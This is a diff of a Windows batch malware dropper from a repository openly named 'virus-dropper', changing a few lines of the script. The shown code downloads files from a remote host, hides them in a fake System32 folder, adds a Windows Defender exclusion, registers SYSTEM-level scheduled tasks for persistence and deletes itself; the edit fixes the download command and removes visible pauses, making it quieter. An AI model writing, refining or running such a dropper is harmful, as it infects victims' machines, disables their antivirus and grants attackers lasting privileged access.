@@ -22,7 +22,7 @@ curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Wi
 
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" "%appdata%\update.bat"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" --output "%appdata%\update.bat"
 powershell -Command "Unblock-file 'Update.bat'"
 move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
@@ -35,8 +35,6 @@ SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.ex
 SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
 del NSudo.exe
-color 0a
-pause
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
